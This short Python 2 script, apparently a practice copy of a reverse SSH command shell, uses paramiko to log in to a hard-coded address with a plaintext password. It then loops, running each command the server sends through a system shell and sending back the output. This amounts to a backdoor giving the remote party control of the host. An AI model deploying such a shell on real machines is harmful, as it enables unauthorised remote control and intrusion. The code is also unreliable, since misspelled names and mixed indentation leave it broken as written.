#execute more commands

import threading
import paramiko
import subprocess

def ssh_command(ip,user,passwd,command):
	client = paramiko.SSHClient()
	#client.load_host_keys('/home/justin/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolucy())
    client.connect(ip,usrname=user,password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print ssh_session.recv(11024)#read banner
        while True:
        	command = ssh_session.recv(1324)#get the commad from the SSH server
        	try:
        		cmd_outpurt =subprocess.check_output(command,shell = True)
        		ssh_session.send(comd_output)
        	except Exception,e:
        		ssh_ssession.send(str(e))
        client.close()
    return

ssh_command('192.168.100.130','justin','lovesthepython','ClientConnected')